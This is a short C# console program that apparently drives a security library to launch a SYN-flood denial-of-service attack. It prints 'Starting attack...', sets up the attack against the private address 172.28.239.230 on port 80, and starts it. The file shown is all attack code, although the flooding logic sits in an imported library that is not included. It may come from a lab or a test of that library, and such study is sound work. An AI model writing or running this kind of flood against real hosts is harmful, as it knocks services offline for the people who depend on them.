// See https://aka.ms/new-console-template for more information

using LD.InfoSec.Network.DoS;

Console.WriteLine("Starting attack...");
DosAttack attack = new(new()
{
    Size = 1,
    DosType = DosType.SynFlood,
    TargetIp = "172.28.239.230",
    TargetPort = 80,
});

await attack.Start();